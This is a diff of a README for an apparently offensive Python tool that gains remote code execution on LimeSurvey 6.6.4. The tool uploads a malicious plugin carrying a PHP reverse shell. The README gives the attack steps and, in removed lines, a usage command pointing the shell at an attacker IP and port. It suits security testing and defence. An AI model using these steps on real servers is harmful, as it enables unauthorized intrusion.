@@ -1,32 +1,40 @@
-# LimeSurvey 6.6.4 Reverse Shell Plugin Exploit (Authenticated)
+# LimeSurvey 6.6.4 - Authenticated RCE Exploit via Plugin Upload
 
-This Python script exploits a file upload vulnerability in **LimeSurvey 6.6.4** by uploading a malicious plugin containing a PHP reverse shell payload. It requires valid **admin credentials** to authenticate and perform the attack. The script automates the following steps:
-
-- Logs into the LimeSurvey admin dashboard using provided credentials and handles CSRF tokens.
-- Generates a malicious plugin ZIP archive with a reverse shell PHP script configured with your IP and port.
-- Uploads the plugin via the vulnerable plugin manager interface.
-- Confirms and installs the uploaded plugin to trigger the reverse shell.
-
-Once executed successfully, the script opens a reverse shell from the target LimeSurvey server back to the attacker’s machine, enabling remote command execution.
+> **DISCLAIMER:**  
+> This tool is provided **for educational purposes only**.  
+> The author does **not condone or support unauthorized access** or malicious activity.  
+> Use responsibly and only on systems you have **explicit permission** to test.
 
 ---
 
-## Features
+## 📌 Description
 
-- Requires valid admin login credentials (authenticated exploit).
-- Automated login with CSRF token extraction.
-- Customizable reverse shell PHP payload.
-- Plugin upload and installation automation.
-- Simple command-line interface (CLI) usage.
+This Python script exploits a **vulnerability in LimeSurvey version 6.6.4** that allows an **authenticated attacker** to upload a malicious plugin containing a **PHP reverse shell**. Once uploaded and activated, the attacker gains remote code execution (RCE) as the web server user.
+
+It automates:
+
+- Login to the LimeSurvey admin dashboard
+- Upload of a ZIP archive containing a malicious plugin
+- Confirmation of the plugin installation
+- Execution via direct access to the plugin's PHP payload
 
 ---
 
-## Usage
+## ⚙️ Features
+
+- Auto-generates malicious plugin files (`config.xml` + PHP reverse shell)
+- Authenticates to LimeSurvey using provided admin credentials
+- Uploads and confirms the plugin install
+- Drops a PHP reverse shell listener for incoming connections
+
+---
+
+## 🛠 Requirements
+
+- Python 3.x
+- `requests` module
+
+Install dependencies:
 
 ```bash
-python3 lime_reverse_shell_exploit.py \
-  --target http://target-limesurvey \
-  --username admin \
-  --password pass123 \
-  --ip attacker_ip \
-  --port attacker_port
+pip install requests
